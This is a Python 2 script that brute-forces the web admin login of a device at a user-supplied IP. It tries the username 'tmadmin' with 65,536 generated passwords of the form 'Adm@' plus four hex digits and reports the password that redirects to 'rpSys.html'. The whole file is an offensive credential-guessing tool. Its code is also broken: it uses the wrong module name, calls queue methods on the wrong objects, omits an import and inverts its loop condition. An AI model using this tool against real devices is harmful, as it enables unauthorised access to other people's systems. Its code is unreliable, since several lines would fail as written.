#!/usr/bin/python
# -*- coding: utf-8 -*-

import requests
from requests.exceptions import ConnectionError
import gevent as Greenlet
from  gevent.queue import Queue

req = Queue(maxsize = 45)
success = False

def gene(x):
    num = len(hex(x).split('0x')[1])
    if num < 4:
        res = '0' * (4 - num) + hex(x).split('0x')[1]
    else:
        res = hex(x).split('0x')[1]
    return 'Adm@' + res.upper()

def task(target):
    while not req.Empty() or success:
        content = gene(req.get())
        payload = {
            'LoginNameValue' : 'tmadmin',
            'LoginPasswordValue' : content, }
        
        try:
            r = request.post('http://' + target + '/Forms/TM2Auth_1',
                             data=payload, allow_redirects=False,
                             timeout=60)
            location = r.headers['Location']
        except ConnectionError as e:
            print '{} is error'.format(str(content))
        
        if 'rpSys.html' in location:
            print 'Success!! Password is {}'.format(content)
            success = True
            
    Greenlet.sleep(0)

def scheduler():
    for i in xrange(65536):
        task.put_nowait(i)
        
if __name__ == '__main__' :
    target = str(raw_input('Target IP: '))
    Greenlet.signal(signal.SIGQUIT, gevent.shutdown)
    Greenlet.spawn(scheduler).join()
    Greenlet.joinall([Greenlet.spawn(task, target)])
    
